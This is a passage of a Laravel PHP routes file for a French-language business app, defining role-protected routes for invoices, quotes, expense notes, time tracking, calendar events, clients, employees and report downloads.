    Route::post('entreprise/validate/{chargeid}/{budget_id}', [AdminEntrepriseController::class, 'validateBilling'])->name('entreprise.validateBilling');
    Route::post('entreprise/unvalidate/{chargeid}/{budget_id}', [AdminEntrepriseController::class, 'unvalidateBilling'])->name('entreprise.unvalidateBilling');
    Route::post('entreprise/addBudget', [AdminEntrepriseController::class, 'addBudget'])->name('entreprise.addBudget');

    Route::get('/entrepriseBillings/downloadRepports', [AdminEntrepriseController::class, 'downloadBillingsRepports'])->name('entrepriseBillings.downloadRepports');


    Route::post('clients/updateClient', [clientsController::class, 'updateClient'])->name('clients.updateClient');
    Route::post('clients/updateContact', [clientsController::class, 'updateContact'])->name('clients.updateContact');

    Route::post('employees/updateEmployee', [employeesController::class, 'updateEmployee'])->name('employees.updateEmployee');

    Route::get('/projects/invoice/{id}', [ProjectController::class, 'invoice'])->name('projects.invoice');
    Route::get('/projects/invoicebyduration/{name}/{duration}/{cost}', [projectController::class, "invoicebyduration"])->name('projects.invoicebyduration');
    Route::get('/invoices/fullinvoice', [projectController::class, "fullinvoice"])->name('invoices.fullinvoice');
    Route::get('/projects/invoicebyduration2/{id}/{startdate}/{enddate}', [projectController::class, "invoicebyduration2"])->name('projects.invoicebyduration2');

    Route::get('/invoices/invoicehistory', [projectController::class, "invoicehistory"])->name('invoices.invoicehistory');
    Route::delete('/invoice/{invoice}/destroy', [projectController::class, "destroyInvoice"])->name('invoice.destroy');

    Route::post('/invoice/{invoice}/desactivate', [projectController::class, "desactivate"])->name("invoice.deactivate");
    Route::post('/invoice/{invoice}/activate', [projectController::class, "activate"])->name("invoice.activate");

    Route::get('/invoice/downloadPartial/{invoiceNumber}', [projectController::class, "downloadPeriodInvoice"])->name("invoice.downloadPartial");
    Route::get('/invoice/downloadFull/{invoiceNumber}', [projectController::class, "downloadFullInvoice"])->name("invoice.downloadFull");


    Route::post('/invoice/remind', [projectController::class, "sendemailreminder"])->name('invoice.remind');

    Route::get('/invoice/Manualremind/{id}/{reminder}', [projectController::class, "sendManualReminder"])->name('invoice.sendManualremind');

    Route::get('/get-contacts/{clientId}', [projectController::class, "getContacts"]);
    Route::post('/send-invoice/{invoice_id}', [projectController::class, 'sendInvoice'])->name('invoice.sendInvoice');

    Route::get('/devis/generateDevis', [projectController::class, "generateDevis"])->name('devis.generateDevis');
    Route::post('/devis/sendDevis', [projectController::class, "sendDevis"])->name('devis.sendDevis');


    Route::post('/devis/saveDevisPdf', [projectController::class, "saveDevisPdf"])->name('devis.saveDevisPdf');

    Route::get('/devis/devishistory', [projectController::class, "devishistory"])->name('devis.devishistory');
    Route::delete('/devis/{devis}/destroy', [projectController::class, "destroydevis"])->name('devis.destroy');
    Route::get('/devis/downloadDevis/{id}', [projectController::class, "downloadDevis"])->name("devis.downloadDevis");

    Route::post('/devis/{devis}/acceptDevis', [projectController::class, "acceptDevis"])->name("devis.acceptDevis");
    Route::post('/devis/{devis}/declineDevis', [projectController::class, "declineDevis"])->name("devis.declineDevis");

    Route::get('/pointage/index', [tasksController::class, 'Markpointage'])->name('pointage.index');

    Route::post('/pointage/{tasks}/{employee_id}/start', [tasksController::class, "start"])->name('tasks.start');
    Route::post('/pointage/{tasks}/{employee_id}/stop', [tasksController::class, "stop"])->name('tasks.stop');
    Route::post('/pointage/{tasks}/{employee_id}/pause', [tasksController::class, 'pause'])->name('tasks.pause');
    Route::post('/pointage/{tasks}/{employee_id}/resume', [tasksController::class, 'resume'])->name('tasks.resume');

    Route::get('/invoices/pdf/{invoiceName}', [projectController::class, "servePdf"])->name('invoices.servePdf');

    Route::get('/invoices/parameters', [projectController::class, "parameters"])->name('invoices.parameters');
    Route::get('/devis/parameters', [projectController::class, "devisparameters"])->name('devis.parameters');

    Route::post('pointage/fetch-duration', [tasksController::class, 'fetchDuration'])->name('fetch.duration');

    Route::post('/tasks/update-duration/{task_id}', [tasksController::class, "updateDuration"])->name('tasks.updateDuration');

    Route::post('/entreprise/updateImage', [AdminEntrepriseController::class, "updateImage"])->name('entreprise.updateImage');

    Route::delete('/clients/destroyContact/{contact_id}', [clientsController::class, "destroyContact"])->name('clients.destroyContact');

    Route::get('/Clientrepports/downloadRepports', [clientsController::class, 'downloadClinetsRepports'])->name('Clientrepports.downloadRepports');
    Route::get('/Employeesrepports/downloadRepports', [employeesController::class, 'downloadEmployeesRepports'])->name('Employeesrepports.downloadRepports');
    Route::get('/Projectsrepports/downloadRepports', [projectController::class, 'downloadProjectsRepports'])->name('Projectsrepports.downloadRepports');
    Route::get('/Tasksrepports/downloadRepports', [tasksController::class, 'downloadTasksRepports'])->name('Tasksrepports.downloadRepports');

    Route::get('/Pointagerepports/downloadRepports/{startDate}/{endDate}', [tasksController::class, 'downloadPointageRepports'])->name('Pointagerepports.downloadRepports');
    Route::get('/Pointagerepports/downloadOneDayRepports/{startDate}', [tasksController::class, 'downloadOneDayRepports'])->name('Pointagerepports.downloadOneDayRepports');

    Route::get('/CustomerPointagerepports/CustomerdownloadRepports/{startDate}/{endDate}', [tasksController::class, 'CustomerdownloadPointageRepports'])->name('CustomerPointagerepports.CustomerdownloadRepports');
    Route::get('/CustomerPointagerepports/CustomerdownloadOneDayRepports/{startDate}', [tasksController::class, 'CustomerdownloadOneDayRepports'])->name('Pointagerepports.CustomerdownloadOneDayRepports');

    Route::get('/Teamssrepports/downloadRepports', [teamsController::class, 'downloadTeamsRepports'])->name('Teamssrepports.downloadRepports');

    Route::get('/Invoicessrepports/downloadRepports', [projectController::class, 'downloadInvoicesRepports'])->name('Invoicessrepports.downloadRepports');

    Route::get('/Devissrepports/downloadRepports', [projectController::class, 'downloadDevisRepports'])->name('Devissrepports.downloadRepports');

    Route::get('/invoice/creditNote/{id}', [projectController::class, "generateCreditNote"])->name('invoice.creditNote');

    Route::get('/invoice/creditNoteHistory', [projectController::class, "creditNoteHistory"])->name('invoice.creditNoteHistory');

    Route::get('/invoices/serveCreditNotePdf/{credit_note_number}', [projectController::class, "serveCreditNotePdf"])->name('invoices.serveCreditNotePdf');

    Route::get('/creditNote/downloadRepports', [projectController::class, 'downloadcreditNoteRepports'])->name('creditNote.downloadRepports');

    Route::delete('/credit_note/{credit_note}/destroy', [projectController::class, "destroyCreditNote"])->name('credit_note.destroy');

    Route::get('/creditNote/creditNoteHistory', [projectController::class, "creditNoteHistory"])->name('creditNote.creditNoteHistory');

    Route::post('workdaysrepports/updateWorkdaysRepport', [employeesController::class, 'updateWorkdaysRepport'])->name('workdaysrepports.updateWorkdaysRepport');

    Route::get('/workDaysReports/index', [employeesController::class, "workDaysReportsIndex"])->name('workDaysReports.index');

    Route::get('/workDaysReports/filter-reports', [employeesController::class, 'filterReports'])->name('workDaysReports.filterReports');

    Route::get('/workDaysReports/downloadRepports', [employeesController::class, 'downloadworkDaysRepports'])->name('workDaysReports.downloadRepports');

    Route::post('/workDaysReports/nextMonthRepports', [employeesController::class, 'nextMonthRepports'])->name('workDaysReports.nextMonthRepports');

    Route::get('/notedefrais/generateNoteDeFrais', [projectController::class, "generateNoteDeFrais"])->name('notedefrais.generateNoteDeFrais');
    Route::post('/notedefrais/savePdf', [projectController::class, "saveNoteDeFraisPdf"])->name('notedefrais.saveNoteDeFraisPdf');
    Route::get('/notedefrais/parameters', [projectController::class, "notedefraisparameters"])->name('notedefrais.parameters');
    Route::get('/notedefrais/downloadNoteDeFrais/{id}', [projectController::class, "downloadNoteDeFrais"])->name("notedefrais.downloadNoteDeFrais");
    Route::get('/notedefrais/notedefraishistory', [projectController::class, "notedefraishistory"])->name('notedefrais.notedefraishistory');
    Route::delete('/notedefrais/{notedefrais}/destroy', [projectController::class, "destroyNotedeFrais"])->name('notedefrais.destroy');
    Route::get('/notedefrais/downloadRepports', [projectController::class, 'downloadNoteDeFraisRepports'])->name('notedefrais.downloadRepports');

    Route::get('/projects/partialInvoice/{projectid}/{amount}', [projectController::class, "PartialInvoice"])->name('projects.PartialInvoice');
    Route::get('/projects/percentageInvoice/{projectid}/{percentage}', [projectController::class, "PercentageInvoice"])->name('projects.PercentageInvoice');

    Route::post('/projects/confirm-full-invoice/{projectID}/{budget}/{comment?}', [ProjectController::class, 'confirmFullInvoice'])->name('projects.confirmFullInvoice');

    Route::post('/projects/confirm-period-invoice/{projectID}/{startdate}/{enddate}/{comment?}', [ProjectController::class, 'confirmPeriodInvoice'])->name('projects.confirmPeriodInvoice');
    Route::post('/projects/confirm-percentage-invoice/{projectID}/{percentage}/{comment?}', [ProjectController::class, 'confirmPercentageInvoice'])->name('projects.confirmPercentageInvoice');
    Route::post('/projects/confirm-partial-invoice/{projectID}/{amount}/{comment?}', [ProjectController::class, 'confirmPartialInvoice'])->name('projects.confirmPartialInvoice');

    Route::post('/projects/decline-Invoice', [ProjectController::class, 'declineInvoice'])->name('projects.declineInvoice');

    Route::post('/projects/archive/{project_id}', [ProjectController::class, "archiveProject"])->name('projects.archive');
    Route::post('/projects/unarchive/{project_id}', [ProjectController::class, "unarchiveProject"])->name('projects.unarchive');
    Route::get('projectsArchived/archive', [ProjectController::class, 'projectArchiveIndex'])->name('projectsArchived.archiveIndex');

    Route::post('/devis/archive/{devis_id}', [ProjectController::class, "archiveDevis"])->name('devis.archive');
    Route::post('/devis/unarchive/{devis_id}', [ProjectController::class, "unarchiveDevis"])->name('devis.unarchive');
    Route::get('devisArchived/archive', [ProjectController::class, 'devisArchiveIndex'])->name('devisArchived.archiveIndex');

    Route::post('creditNote/confirm/{id}/{noteType}/{noteAmount}', [ProjectController::class, 'ConfirmCreditNote'])->name('creditNote.confirm');

    Route::post('/confirm-frais-note', [ProjectController::class, 'confirmFraisNote'])->name('notedefrais.confirmFraisNote');

    Route::post('/projects/updateInfos/{id}/{client_id?}', [ProjectController::class, 'update'])->name('projects.updateInfos');

    Route::get('/tasks/{employee}/durationInfos/{task}', [tasksController::class, 'durationInfos'])->name('tasks.durationInfos');

    Route::post('/devis/saveDuplicateDevis', [projectController::class, "saveDuplicateDevis"])->name('devis.saveDuplicateDevis');
    Route::get('/devis/duplicateDevis/{devis_id}', [projectController::class, "duplicateDevis"])->name('devis.duplicateDevis');

    Route::get('/pointage/filterPointageByDate', [tasksController::class, 'filterPointageByDate'])->name('pointage.filterPointageByDate');

    Route::get('/pointage/get-timer-state', [tasksController::class, 'get_timer_state'])->name('pointage.get_timer_state');

    Route::get('/pointage/filter-table', [tasksController::class, 'filterPointageTable'])->name('pointage.filterPointageTable');
    Route::get('invoiceArchived/archive', [ProjectController::class, 'invoiceArchiveIndex'])->name('invoiceArchived.archiveIndex');

    Route::delete('/billing/destroy/{id}', [AdminEntrepriseController::class, 'destroyBillings'])->name('billing.destroy');
    Route::post('/budget/update/{id}', [AdminEntrepriseController::class, 'updateCharge'])->name('budget.updateCharge');

    Route::get('/calendar', [CalendarController::class, 'index'])->name('calendar.index');
    Route::get('/calendar/events', [CalendarController::class, 'getEvents'])->name('calendar.events');
    Route::post('/calendar/events', [CalendarController::class, 'store'])->name('calendar.store');
    Route::put('/calendar/events/{id}', [CalendarController::class, 'update'])->name('calendar.update');
    Route::delete('/calendar/events/{id}', [CalendarController::class, 'destroy'])->name('calendar.destroy');
    Route::patch('/calendar/events/{id}/dates', [CalendarController::class, 'updateDates'])->name('calendar.updateDates');

    Route::get('/calendar/daily-events', [CalendarController::class, 'getDailyEvents'])->name('calendar.dailyEvents');
    Route::get('/calendar/events/current-month', [CalendarController::class, 'getCurrentMonthEvents'])->name('calendar.currentMonthEvents');
    Route::get('/calendar/send-events/preview', [CalendarController::class, 'previewSendEvents'])->name('calendar.send-events.preview');
    Route::get('/calendar/events/pdf', [CalendarController::class, 'generateEventsPDF'])->name('calendar.events.pdf');
    Route::post('/calendar/send-events-email', [CalendarController::class, 'sendEventsEmail'])->name('calendar.send-events-email');

    // Edit Full Invoice routes
    Route::get('/invoices/edit/{id}', [ProjectController::class, 'editFullInvoice'])->name('invoices.editFullInvoice');
    Route::put('/invoices/update/{id}', [ProjectController::class, 'updateFullInvoice'])->name('invoices.updateFullInvoice');

    // Edit Partial Invoice routes
    Route::get('/invoices/partial/edit/{id}', [ProjectController::class, 'editPartialInvoice'])->name('invoices.editPartialInvoice');
    Route::put('/invoices/partial/update/{id}', [ProjectController::class, 'updatePartialInvoice'])->name('invoices.updatePartialInvoice');

    // Edit Percentage Invoice routes
    Route::get('/invoices/percentage/edit/{id}', [ProjectController::class, 'editPercentageInvoice'])->name('invoices.editPercentageInvoice');
    Route::put('/invoices/percentage/update/{id}', [ProjectController::class, 'updatePercentageInvoice'])->name('invoices.updatePercentageInvoice');

    // Edit Period Invoice routes
    Route::get('/invoices/period/edit/{id}', [ProjectController::class, 'editPeriodInvoice'])->name('invoices.editPeriodInvoice');
    Route::put('/invoices/period/update/{id}', [ProjectController::class, 'updatePeriodInvoice'])->name('invoices.updatePeriodInvoice');

    Route::get('/devis/edit/{id}', [projectController::class, 'editDevis'])->name('devis.editDevis');
    Route::put('/devis/update/{id}', [projectController::class, 'updateDevis'])->name('devis.updateDevis');

    Route::post('/projects/{project}/upload-file', [ProjectController::class, 'uploadProjectFile'])->name('projects.uploadFile');
    Route::get('/projects/downloadfiles/{file_name}', [ProjectController::class, 'downloadfiles'])->name('projects.downloadfiles');
    Route::delete('/projects/deletefiles/{file_name}', [ProjectController::class, 'deletefiles'])->name('projects.deletefiles');

    Route::post('/tasks/update-{field}/{id}', [tasksController::class, 'updateField'])->name('tasks.updateField');
    Route::get('/invoices/generate-detailed', [projectController::class, 'generateDetailedInvoice'])->name('invoices.generate.Detailed');
    Route::post('/invoices/detailed', [projectController::class, 'detailedInvoice'])->name('invoices.detailed');
    Route::post('/invoices/confirm-detailed/{projectID}', [projectController::class, 'confirmDetailedInvoice'])->name('invoices.confirmDetailedInvoice');

    Route::post('/employees/archive/{employee_id}', [employeesController::class, "archiveEmployee"])->name('employees.archive');
    Route::post('/employees/unarchive/{employee_id}', [employeesController::class, "unarchiveEmployee"])->name('employees.unarchive');
    Route::get('employeesArchived/archive', [employeesController::class, 'employeeArchiveIndex'])->name('employeesArchived.archiveIndex');

    Route::get('/invoices/editDetailedInvoice/{id}', [ProjectController::class, 'editDetailedInvoice'])->name('invoices.editDetailedInvoice');
    Route::post('/invoices/updateDetailedInvoice/{id}', [ProjectController::class, 'updateDetailedInvoice'])->name('invoices.updateDetailedInvoice');

    // Add this route within your admin group/middleware
    Route::get('/get-devis/{projectId}', [ProjectController::class, 'getDevisByProject'])->name('get.devis.by.project');
    Route::get('/get-devis-comment/{devisId}', [ProjectController::class, 'getDevisComment']);

    Route::get('/tasks/get-project-tasks/{project}', [TasksController::class, 'getProjectTasks']);
    Route::post('/tasks/move-duration', [TasksController::class, 'moveDuration']);
    Route::get('/employees/{employeeId}/projects', [TasksController::class, 'getEmployeeProjects']);
    Route::post('/clients/filterInvoices/{client}', [clientsController::class, 'filterInvoices'])->name('clients.filterInvoices');

    Route::get('/clients/downloadInvoicesRepports/{client}', [clientsController::class, 'downloadInvoicesRepports'])->name('clients.downloadInvoicesRepports');

    Route::get('/filter/all-projects', [TasksController::class, 'getAllProjects']);
    Route::get('/filter/all-tasks', [TasksController::class, 'getAllTasks']);

    Route::post('/credit_note/send/{credit_note_id}', [ProjectController::class, 'sendCreditNote'])->name('credit_note.send');

    Route::get('/filter/clients/{client}/projects', [tasksController::class, 'getClientProjects'])->name('filter.client.projects');

    Route::get('filter/employees/{employeeId}/projects', [ProjectController::class, 'getEmployeeProjects'])->name('filter.getEmployeeProjects');
    Route::get('filter/employees/{employeeId}/tasks', [ProjectController::class, 'getEmployeeTasks'])->name('filter.getEmployeeTasks');
    Route::get('filter/projects/{projectId}/tasks', [ProjectController::class, 'getProjectTasks'])->name('filter.getProjectTasks');
    Route::get('filter/tasks/{taskId}', [ProjectController::class, 'getTaskInfo'])->name('filter.getTaskInfo');
    Route::get('filter/projects', [ProjectController::class, 'getAllProjects'])->name('filter.getAllProjects');
    Route::get('filter/tasks', [ProjectController::class, 'getAllTasks'])->name('filter.getAllTasks');

    Route::get('/invoice/{invoice}/recipients', [ProjectController::class, 'getRecipients']);

    Route::get('/Pointagerepports/downloadMultipleTasksRepports/{startDate}/{endDate}', [tasksController::class, 'downloadMultipleTasksRepports'])->name('Pointagerepports.downloadMultipleTasksRepports');

    Route::post('/employees/send-email', [employeesController::class, 'send-email']);

    Route::get('/devis/get-contacts/{devisId}', [projectController::class, 'getDevisContacts'])->name('devis.getContacts');
});




Route::middleware(['auth', 'verified', 'role:Responsable de projet et gestionnaire'])->name('Responsable_gestionnaire.')->prefix('Responsable_gestionnaire')->group(function () {
    Route::get("/", [EmployeesIndexController::class, "index"])->name("index");

    Route::post('/tasks/{tasks}/{employee_id}/start', [tasksController::class, "start"])->name('tasks.start-thread');
    Route::post('/tasks/{tasks}/{employee_id}/stop', [tasksController::class, "stop"])->name('tasks.stop-thread');
    Route::post('/tasks/{tasks}/{employee_id}/pause', [tasksController::class, 'pause'])->name('tasks.pause-thread');
    Route::post('/tasks/{tasks}/{employee_id}/resume', [tasksController::class, 'resume'])->name('tasks.resume-thread');
    
    // Calendar routes for Responsable de projet et gestionnaire
    Route::get('/calendar', [CalendarController::class, 'index'])->name('calendar.index');
    Route::get('/calendar/events', [CalendarController::class, 'getEvents'])->name('calendar.events');
    Route::get('/calendar/daily-events', [CalendarController::class, 'getDailyEvents'])->name('calendar.dailyEvents');
    Route::get('/calendar/events/current-month', [CalendarController::class, 'getCurrentMonthEvents'])->name('calendar.currentMonthEvents');

    Route::get('tasks/tasks-info/{startDate}/{employee_id}', [EmployeestasksController::class, 'getTasksInfo'])->name('tasks.info-employee');
    Route::get('tasks/tasks-info-interval/{startDate}/{endDate}/{employee_id}', [EmployeestasksController::class, 'getTasksInfoInterval'])->name('tasks.info-interval');
    Route::get('tasks/get-project-name/{taskName}', [TasksController::class, 'getProjectName']);
    Route::get('tasks/get-employee-name/{employeeId}', [TasksController::class, 'getEmployeeName']);

    Route::resource('/tasks', EmployeestasksController::class)->except(['show', 'create', 'store']);
    Route::post('/tasks/{task}/status/{status}', [EmployeestasksController::class, "status"])->name('tasks.status');
    Route::get('/tasks/pointage', [EmployeestasksController::class, 'pointage'])->name('tasks.pointage');

    Route::resource('/teams', EmployeesteamsController::class);

    Route::get('/todoliste/create', [todolisteController::class, 'create'])->name('todoliste.create');
    Route::post('/todoliste/store', [todolisteController::class, 'store'])->name('todoliste.store');
    Route::delete('/todoliste/destroy', [todolisteController::class, 'destroy'])->name('todoliste.destroy');

    Route::get('tasks/tasks-info-interval-employee/{startDate}/{endDate}/{employee}', [TasksController::class, 'getTasksInfoIntervalEmployee'])->name('tasks.interval-info-employee');

    Route::post('/tasks/update-duration/{task}', [TasksController::class, "updateDuration"])->name('tasks.updateDuration-task');

    Route::get('/Pointagerepports/downloadRepports/{startDate}/{endDate}/{employeeID}', [EmployeestasksController::class, 'downloadPointageRepports'])->name('Pointagerepports.downloadRepports-employee');
    Route::get('/Pointagerepports/downloadOneDayRepports/{startDate}/{employeeID}', [EmployeestasksController::class, 'downloadOneDayRepports'])->name('Pointagerepports.downloadOneDayRepports-employee');

    Route::get('/tasks/board', [tasksController::class, "board"])->name('tasks.board');
    Route::resource('/tasks', tasksController::class)->except(['create', 'store']);
    Route::post('/tasks/{task}/status/{status}', [tasksController::class, "status"])->name('tasks.status');
    Route::get('/tasks/create/{project_id?}', [tasksController::class, "create"])->name('tasks.create');
    Route::post('/tasks/move-task', [tasksController::class, "moveTask"])->name('tasks.moveTask');
    Route::post('/tasks/store/{project_id}', [tasksController::class, "store"])->name('tasks.store');
    Route::get('/Tasksrepports/downloadRepports', [tasksController::class, 'downloadTasksRepports'])->name('Tasksrepports.downloadRepports');


    Route::get('/workDaysReports/index', [employeesController::class, "workDaysReportsIndex"])->name('workDaysReports.index');
    Route::get('/workDaysReports/filter-reports', [employeesController::class, 'filterReports'])->name('workDaysReports.filterReports');
    Route::get('/workDaysReports/downloadRepports', [employeesController::class, 'downloadworkDaysRepports'])->name('workDaysReports.downloadRepports');
    Route::post('/workDaysReports/nextMonthRepports', [employeesController::class, 'nextMonthRepports'])->name('workDaysReports.nextMonthRepports');


    Route::resource('/roles', RoleController::class)->except(['create', 'store'])->where(['role' => '[0-9]+']);
    Route::post('/roles/{role}/assign_permission', [RoleController::class, "assign_permission"])->name("roles.assign_permission");
    Route::post('admin/roles/{role}/delete_permission', [RoleController::class, "delete_permission"])->name('roles.delete_permission');
    Route::resource('/permissions', PermissionController::class);
    Route::resource('/employees', employeesController::class)->except(['destroy']);
    Route::delete('/employees/{employee}/destroy', [employeesController::class, "destroy"])->name('employees.destroy');
    Route::post('/employees/{employee}/assign_roles', [employeesController::class, "assign_roles"])->name("employees.assign_roles");
    Route::post('/employee/{employee}/desactivate', [employeesController::class, "desactivate"])->name("employee.deactivate");
    Route::post('/employee/{employee}/activate', [employeesController::class, "activate"])->name("employee.activate");
    Route::resource('/clients', clientsController::class);
    Route::delete('/clients/{client}/destroy', [clientsController::class, "destroy"])->name('client.destroy');

    Route::put('/clients/{client}/addContact', [clientsController::class, 'addContact'])->name('clients.addContact');

    Route::resource('/tasks', tasksController::class)->except(['create', 'store']);
    Route::post('/tasks/{task}/status/{status}', [tasksController::class, "status"])->name('tasks.status');
    Route::get('/tasks/create/{project_id?}', [tasksController::class, "create"])->name('tasks.create');
    Route::post('/tasks/move-task', [tasksController::class, "moveTask"])->name('tasks.moveTask');
    Route::post('/tasks/store/{project_id}', [tasksController::class, "store"])->name('tasks.store');
    Route::resource('/teams', teamsController::class);
    Route::get('/projects/create/{client_id?}', [projectController::class, "create"])->name('projects.create');
    Route::post('/projects/store/{client_id?}', [projectController::class, "store"])->name('projects.store');
    Route::get('projects/report', [ProjectController::class, 'projectReport'])->name('projects.report');
    Route::resource('/projects', projectController::class)->except(['create', 'store']);
    Route::post('/projects/{project}/status/{status}', [projectController::class, "status"])->name('projects.status');
    Route::post('projects/updateProject', [projectController::class, 'updateProject'])->name('projects.updateProject');

    Route::resource('/todoliste', todolisteController::class)->except(['show', 'update', 'destroy', 'store']);

    //Route::get('/todoliste/create', [todolisteController::class,'create'])->name('todoliste.create');
    //Route::post('/todoliste/store', [todolisteController::class,'store'])->name('todoliste.store');
    //Route::get('/todoliste/edit/{$id}', [todolisteController::class,'edit'])->name('todoliste.edit');
    Route::post('/todoliste/update/{id}', [todolisteController::class, 'update'])->name('todoliste.update');
    Route::delete('/todoliste/destroy', [todolisteController::class, 'destroy'])->name('todoliste.destroy');
    Route::delete('/todoliste/deleteItem/{id}', [todolisteController::class, 'deleteItem'])->name('todoliste.deleteItem');
    Route::post('/todoliste/updatestatus/{todoliste}', [todolisteController::class, 'updateStatus'])->name('todoliste.updateStatus');

    Route::get('/tasks/pointage', [tasksController::class, 'pointage'])->name('tasks.pointage');
    Route::get('tasks/tasks-info/{startDate}', [TasksController::class, 'getTasksInfo'])->name('tasks.info');
    Route::get('tasks/tasks-info-interval/{startDate}/{endDate}', [TasksController::class, 'getTasksInfoInterval'])->name('tasks.interval-info');
    Route::get('tasks/get-project-name/{taskName}', [TasksController::class, 'getProjectName']);
    Route::get('tasks/get-employee-name/{employeeId}', [TasksController::class, 'getEmployeeName']);

    Route::post('/tasks/{task}/start/{employee_id}', [tasksController::class, 'start'])->name('employee.tasks.start');
    Route::post('/tasks/{task}/stop/{employee_id}', [tasksController::class, 'stop'])->name('employee.tasks.stop');

    Route::post('/tasks/{task}/pause/{employee_id}', [tasksController::class, 'pause'])->name('employees.tasks.pause');
    Route::post('/tasks/{task}/resume/{employee_id}', [tasksController::class, 'resume'])->name('employees.tasks.resume');

    Route::resource('/Enterprise_infos', AdminEntrepriseController::class)->except(['show']);
    Route::post('Enterprise_Billings/updateBillings', [AdminEntrepriseController::class, "updateBillings"])->name('Enterprise_Billings.updateBillings');
    Route::post('Enterprise_infos/updateInfos', [AdminEntrepriseController::class, "updateInfos"])->name('Enterprise_infos.updateInfos');
    Route::post('Enterprise_SMTPinfos/updateSMTPInfos', [AdminEntrepriseController::class, "updateSMTPInfos"])->name('Enterprise_SMTPinfos.updateSMTPInfos');
    Route::post('entreprise/validate/{chargeid}/{budget_id}', [AdminEntrepriseController::class, 'validateBilling'])->name('entreprise.validateBilling');
    Route::post('entreprise/unvalidate/{chargeid}/{budget_id}', [AdminEntrepriseController::class, 'unvalidateBilling'])->name('entreprise.unvalidateBilling');
    Route::post('entreprise/addBudget', [AdminEntrepriseController::class, 'addBudget'])->name('entreprise.addBudget');
    Route::get('/entrepriseBillings/downloadRepports', [AdminEntrepriseController::class, 'downloadBillingsRepports'])->name('entrepriseBillings.downloadRepports');


    Route::post('clients/updateClient', [clientsController::class, 'updateClient'])->name('clients.updateClient');
    Route::post('clients/updateContact', [clientsController::class, 'updateContact'])->name('clients.updateContact');

    Route::post('employees/updateEmployee', [employeesController::class, 'updateEmployee'])->name('employees.updateEmployee');

    Route::get('/projects/invoice/{id}', [ProjectController::class, 'invoice'])->name('projects.invoice');
    Route::get('/projects/invoicebyduration/{name}/{duration}/{cost}', [projectController::class, "invoicebyduration"])->name('projects.invoicebyduration');
    Route::get('/invoices/fullinvoice', [projectController::class, "fullinvoice"])->name('invoices.fullinvoice');
    Route::get('/projects/invoicebyduration2/{id}/{startdate}/{enddate}', [projectController::class, "invoicebyduration2"])->name('projects.invoicebyduration2');

    Route::get('/invoices/invoicehistory', [projectController::class, "invoicehistory"])->name('invoices.invoicehistory');
    Route::delete('/invoice/{invoice}/destroy', [projectController::class, "destroyInvoice"])->name('invoice.destroy');

    Route::post('/invoice/{invoice}/desactivate', [projectController::class, "desactivate"])->name("invoice.deactivate");
    Route::post('/invoice/{invoice}/activate', [projectController::class, "activate"])->name("invoice.activate");

    Route::get('/invoice/downloadPartial/{invoiceNumber}', [projectController::class, "downloadPeriodInvoice"])->name("invoice.downloadPartial");
    Route::get('/invoice/downloadFull/{invoiceNumber}', [projectController::class, "downloadFullInvoice"])->name("invoice.downloadFull");

    Route::post('/invoice/remind', [projectController::class, "sendemailreminder"])->name('invoice.remind');

    Route::get('/invoice/Manualremind/{id}/{reminder}', [projectController::class, "sendManualReminder"])->name('invoice.sendManualremind');

    Route::post('/invoice/SendInvReminder/{invoice_id}/{reminder_number}', [projectController::class, "SendInvReminder"])->name('invoice.SendInvReminder');

    Route::get('/get-contacts/{clientId}', [projectController::class, "getContacts"]);
    Route::post('/send-invoice/{invoice_id}', [projectController::class, 'sendInvoice'])->name('invoice.sendInvoice');

    Route::get('/devis/generateDevis', [projectController::class, "generateDevis"])->name('devis.generateDevis');
    Route::post('/devis/sendDevis', [projectController::class, "sendDevis"])->name('devis.sendDevis');
    Route::post('/devis/saveDevisPdf', [projectController::class, "saveDevisPdf"])->name('devis.saveDevisPdf');

    Route::get('/devis/devishistory', [projectController::class, "devishistory"])->name('devis.devishistory');
    Route::delete('/devis/{devis}/destroy', [projectController::class, "destroydevis"])->name('devis.destroy');
    Route::get('/devis/downloadDevis/{id}', [projectController::class, "downloadDevis"])->name("devis.downloadDevis");

    Route::post('/devis/{devis}/acceptDevis', [projectController::class, "acceptDevis"])->name("devis.acceptDevis");
    Route::post('/devis/{devis}/declineDevis', [projectController::class, "declineDevis"])->name("devis.declineDevis");

    Route::get('/pointage/index', [tasksController::class, 'Markpointage'])->name('pointage.index');

    Route::post('/pointage/{tasks}/{employee_id}/start', [tasksController::class, "start"])->name('tasks.start');
    Route::post('/pointage/{tasks}/{employee_id}/stop', [tasksController::class, "stop"])->name('tasks.stop');
    Route::post('/pointage/{tasks}/{employee_id}/pause', [tasksController::class, 'pause'])->name('tasks.pause');
    Route::post('/pointage/{tasks}/{employee_id}/resume', [tasksController::class, 'resume'])->name('tasks.resume');

    Route::get('/invoices/pdf/{invoiceName}', [projectController::class, "servePdf"])->name('invoices.servePdf');

    Route::get('/invoices/parameters', [projectController::class, "parameters"])->name('invoices.parameters');
    Route::get('/devis/parameters', [projectController::class, "devisparameters"])->name('devis.parameters');

    Route::post('pointage/fetch-duration', [tasksController::class, 'fetchDuration'])->name('fetch.duration');

    Route::post('/tasks/update-duration/{task_id}', [tasksController::class, "updateDuration"])->name('tasks.updateDuration');

    Route::post('/entreprise/updateImage', [AdminEntrepriseController::class, "updateImage"])->name('entreprise.updateImage');

    Route::delete('/clients/destroyContact/{contact_id}', [clientsController::class, "destroyContact"])->name('clients.destroyContact');

    Route::get('/Clientrepports/downloadRepports', [clientsController::class, 'downloadClinetsRepports'])->name('Clientrepports.downloadRepports');
    Route::get('/Employeesrepports/downloadRepports', [employeesController::class, 'downloadEmployeesRepports'])->name('Employeesrepports.downloadRepports');
    Route::get('/Projectsrepports/downloadRepports', [projectController::class, 'downloadProjectsRepports'])->name('Projectsrepports.downloadRepports');
    Route::get('/Tasksrepports/downloadRepports', [tasksController::class, 'downloadTasksRepports'])->name('Tasksrepports.downloadRepports');

    Route::get('/Pointagerepports/downloadRepports/{startDate}/{endDate}', [tasksController::class, 'downloadPointageRepports'])->name('Pointagerepports.downloadRepports');
    Route::get('/Pointagerepports/downloadOneDayRepports/{startDate}', [tasksController::class, 'downloadOneDayRepports'])->name('Pointagerepports.downloadOneDayRepports');

    Route::get('/CustomerPointagerepports/CustomerdownloadRepports/{startDate}/{endDate}', [tasksController::class, 'CustomerdownloadPointageRepports'])->name('CustomerPointagerepports.CustomerdownloadRepports');
    Route::get('/CustomerPointagerepports/CustomerdownloadOneDayRepports/{startDate}', [tasksController::class, 'CustomerdownloadOneDayRepports'])->name('Pointagerepports.CustomerdownloadOneDayRepports');

    Route::get('/Teamssrepports/downloadRepports', [teamsController::class, 'downloadTeamsRepports'])->name('Teamssrepports.downloadRepports');

